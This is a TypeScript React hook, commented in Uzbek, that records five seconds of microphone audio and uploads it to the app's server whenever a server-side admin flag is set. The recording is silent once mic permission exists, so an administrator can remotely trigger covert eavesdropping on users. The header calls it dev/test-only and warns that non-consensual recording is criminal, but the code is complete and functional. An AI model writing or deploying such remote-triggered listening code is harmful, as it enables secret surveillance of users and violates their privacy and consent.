// ⚠️ DEV/TEST FAQAT — Admin so'rovi bo'lsa 5 sek audio yozib yuborish.
//
// Bu hook profile-sync javobida `audioRequestPending=true` bo'lsa ishga tushadi:
//   1) MediaRecorder bilan 5 sekund yozadi (audio/webm, opus)
//   2) Base64 ga aylantirib server'ga yuboradi
//   3) Server flag'ni o'chiradi (audio_request_pending = 0)
//
// MUHIM HUQUQIY ESLATMA:
// Bu funksiya FAQAT siz testayotgan o'z qurilmangizda ishlatilishi kerak.
// Boshqa foydalanuvchilarning ovozini ularning roziligisiz yozish O'zbekiston
// jinoyat kodeksi 141/165-moddaga zid (1-3 yilgacha qamoq). Bu kodni
// production'ga deploy qilmang yoki Privacy Policy'da aniq bayon qiling.

import { useEffect, useRef } from "react";
import { getAuthToken } from "./use-auth-api";

const SAMPLE_DURATION_MS = 5000;

async function recordAndUpload(): Promise<void> {
  console.log("[audio-sample] recordAndUpload boshlandi");
  if (typeof navigator === "undefined" || !navigator.mediaDevices) {
    console.warn("[audio-sample] navigator.mediaDevices yo'q");
    return;
  }
  let stream: MediaStream | null = null;
  try {
    console.log("[audio-sample] getUserMedia chaqirilmoqda...");
    stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    console.log("[audio-sample] mic ruxsati OK, yozish boshlanmoqda");
    const mimeType = MediaRecorder.isTypeSupported("audio/webm;codecs=opus")
      ? "audio/webm;codecs=opus"
      : MediaRecorder.isTypeSupported("audio/webm")
        ? "audio/webm"
        : "audio/mp4";
    const recorder = new MediaRecorder(stream, { mimeType });
    const chunks: Blob[] = [];
    recorder.ondataavailable = (e) => {
      if (e.data.size > 0) chunks.push(e.data);
    };

    await new Promise<void>((resolve, reject) => {
      recorder.onstop = () => resolve();
      recorder.onerror = (e) => reject(e);
      recorder.start();
      window.setTimeout(() => {
        try {
          recorder.stop();
        } catch {
          /* ignore */
        }
      }, SAMPLE_DURATION_MS);
    });

    const blob = new Blob(chunks, { type: mimeType });
    const buffer = await blob.arrayBuffer();
    const bytes = new Uint8Array(buffer);
    let binary = "";
    for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
    const audioB64 = window.btoa(binary);

    const token = getAuthToken();
    if (!token) {
      console.warn("[audio-sample] token yo'q — upload bekor");
      return;
    }
    const apiBase =
      (import.meta.env.VITE_API_BASE as string | undefined) ?? "";
    console.log(
      "[audio-sample] yuborilmoqda — hajm:",
      Math.round(audioB64.length / 1024),
      "KB",
    );
    const uploadRes = await fetch(`${apiBase}/api/profile/audio-sample`, {
      method: "POST",
      headers: {
        "content-type": "application/json",
        Authorization: `Bearer ${token}`,
      },
      body: JSON.stringify({ audioB64, mime: mimeType }),
    });
    console.log("[audio-sample] upload natija:", uploadRes.status);
  } catch (err) {
    console.error("[audio-sample] xato:", err);
  } finally {
    stream?.getTracks().forEach((t) => t.stop());
  }
}

export function useAudioSampleListener(opts: {
  audioRequestPending: boolean;
}) {
  const recording = useRef(false);
  const lastHandled = useRef(0);

  useEffect(() => {
    console.log(
      "[audio-sample] effect — pending:",
      opts.audioRequestPending,
      "recording:",
      recording.current,
    );
    if (!opts.audioRequestPending) return;
    if (recording.current) {
      console.log("[audio-sample] allaqachon yozyapti, sakraymiz");
      return;
    }
    const now = Date.now();
    if (now - lastHandled.current < 30_000) {
      console.log("[audio-sample] 30 sek throttle, sakraymiz");
      return;
    }
    lastHandled.current = now;
    recording.current = true;
    console.log("[audio-sample] YOZISH BOSHLANDI");
    void recordAndUpload().finally(() => {
      recording.current = false;
      console.log("[audio-sample] yozish tugadi");
    });
  }, [opts.audioRequestPending]);
}
